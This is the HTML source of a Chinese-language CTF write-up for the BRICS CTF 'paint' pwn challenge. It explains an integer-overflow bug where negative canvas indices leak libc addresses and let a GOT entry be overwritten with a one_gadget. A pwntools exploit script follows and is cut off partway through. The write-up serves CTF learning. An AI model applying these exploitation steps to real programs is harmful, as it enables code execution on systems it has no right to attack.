class=&#34;line&#34;&gt;root@ff854125b9c3:/# /lib/x86_64-linux-gnu/libc.so&lt;span class=&#34;number&#34;&gt;.6&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C &lt;span class=&#34;title function_&#34;&gt;Library&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(Ubuntu GLIBC &lt;span class=&#34;number&#34;&gt;2.35&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;-0u&lt;/span&gt;buntu3&lt;span class=&#34;number&#34;&gt;.1&lt;/span&gt;)&lt;/span&gt; stable release version 2.35.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_&#34;&gt;Copyright&lt;/span&gt; &lt;span class=&#34;params&#34;&gt;(C)&lt;/span&gt; 2022 Free Software Foundation, Inc.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;This is &lt;span class=&#34;built_in&#34;&gt;free&lt;/span&gt; software; see the source &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; copying conditions.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;There is NO warranty; not even &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; MERCHANTABILITY or FITNESS FOR A&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PARTICULAR PURPOSE.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Compiled by GNU CC version &lt;span class=&#34;number&#34;&gt;11.2&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;.0&lt;/span&gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc ABIs: UNIQUE IFUNC ABSOLUTE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;For bug reporting instructions, please see:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https:&lt;span class=&#34;comment&#34;&gt;//bugs.launchpad.net/ubuntu/+source/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;后面可以上脚本搭建环境调试, 准备好自己那个脚本&lt;/p&gt;
&lt;p&gt;glibc-allinone的源有时候不行，找到了一个有的&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/&#34;&gt;https://ubuntu.repo.cure.edu.uy/mirror/pool/main/g/glibc/&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;思路&#34;&gt;&lt;a href=&#34;#思路&#34; class=&#34;headerlink&#34; title=&#34;思路&#34;&gt;&lt;/a&gt;思路&lt;/h2&gt;&lt;h3 id=&#34;画布结构&#34;&gt;&lt;a href=&#34;#画布结构&#34; class=&#34;headerlink&#34; title=&#34;画布结构&#34;&gt;&lt;/a&gt;画布结构&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;                    +---------+----------+--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |    chunk head      |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    +---------+----------+-----------------+--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canvas[idx] -&amp;gt;      +---------+----------+--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |          v3   v2   | v0+&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;malloc&lt;/span&gt; canvas |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    +---------+----------+-----------------+--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;canvas[idx] + &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; -&amp;gt; +---------+----------+--------------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |      rate          |    comment addr    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    |                    |                    |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    +---------+----------+-----------------+--+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h3 id=&#34;泄漏libc地址&#34;&gt;&lt;a href=&#34;#泄漏libc地址&#34; class=&#34;headerlink&#34; title=&#34;泄漏libc地址&#34;&gt;&lt;/a&gt;泄漏libc地址&lt;/h3&gt;&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;数字不一定是正的,可以输入负的!!!  注意学习这种漏洞思维&lt;/font&gt;, 可以看到canvas前面有libc的函数,可以利用这个来泄漏地址&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926190630226-1695726390524-1.png&#34; alt=&#34;image-20230926190630226&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改got表指针为onegadget&#34;&gt;&lt;a href=&#34;#修改got表指针为onegadget&#34; class=&#34;headerlink&#34; title=&#34;修改got表指针为onegadget&#34;&gt;&lt;/a&gt;修改got表指针为onegadget&lt;/h3&gt;&lt;p&gt;​		其实本质就是利用负数溢出，让操作以为是在操作堆块，找到对应的位置进行操作即可，&lt;/p&gt;
&lt;p&gt;​		rate(-8,0x222,’\x08\x01’*4+p64(addr))   &lt;/p&gt;
&lt;p&gt;​		这里的话,&lt;font color=&#34;red&#34;&gt;会把-8这个位置当成画布结构数据区开头&lt;/font&gt;, 第一个圈起来的位置则是存放comment chunk 地址的,然后再给comment赋值’\x08\x01’*4+p64(addr)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926192156596.png&#34; alt=&#34;image-20230926192156596&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		draw(-5,p64(one))   -5是红色位置,&lt;font color=&#34;red&#34;&gt;这里又把-5开始的位置当成了画布结构的数据区开头&lt;/font&gt; 在draw函数里就是canvas[idx],这是画布的上层结构,而画布内容的存储位置是蓝色的, &lt;font color=&#34;red&#34;&gt;这里就可以对蓝色指向的地址进行修改了,也就是got表&lt;/font&gt;&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928172822667.png&#34; alt=&#34;image-20230928172822667&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928172835585.png&#34; alt=&#34;image-20230928172835585&#34; style=&#34;zoom:50%;&#34;&gt;

&lt;p&gt;​		往画布里,也就是got表进行修改, 改成onegadget&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230928153346749.png&#34; alt=&#34;image-20230928153346749&#34; style=&#34;zoom:50%;&#34;&gt;



&lt;p&gt;​		(这里地址不对,不是同一次调试的,gdb里有pie),但是原理一样,read后,把got表改成了onegadget&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-42-BRICS-CTF-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E4%B8%80%E9%A2%98/image-20230926192740096.png&#34; alt=&#34;image-20230926192740096&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;exp&#34;&gt;&lt;a href=&#34;#exp&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;p&gt;python2版本&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt;*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context(os=&lt;span class=&#34;string&#34;&gt;&amp;#x27;linux&amp;#x27;&lt;/span&gt;,arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#elf=ELF(&amp;#x27;pwn&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libc=ELF(&lt;span class=&#34;string&#34;&gt;&amp;#x27;libc.so.6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p=process(&amp;#x27;./vuln&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#p=process(&amp;#x27;./pwn&amp;#x27;,env=&amp;#123;&amp;#x27;LD_PRELOAD&amp;#x27;:&amp;#x27;./libc.so.6&amp;#x27;&amp;#125;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=remote(&lt;span class=&#34;string&#34;&gt;&amp;#x27;paint-71ae86dc10a3fe17.brics-ctf.ru&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;13003&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;add&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,wid,hei&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter canvas width (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(wid))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter canvas height (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(hei))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;resize&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,wid,hei&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter new width (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(wid))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter new height (1-255): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.send(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(hei))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;draw&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,data&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;3&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;` chars in `height` lines):&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;#for i in range(wid):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.send(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(data))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;delete&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;6&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;show&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;4&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;comment&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;,x,rate&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;gt; &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;5&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter idx: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;id&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Enter rate: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(x))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ment (y/n): &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;y&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;#x27;r your comment: &amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(rate))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#泄漏地址&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;show(-&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.recv(&lt;span 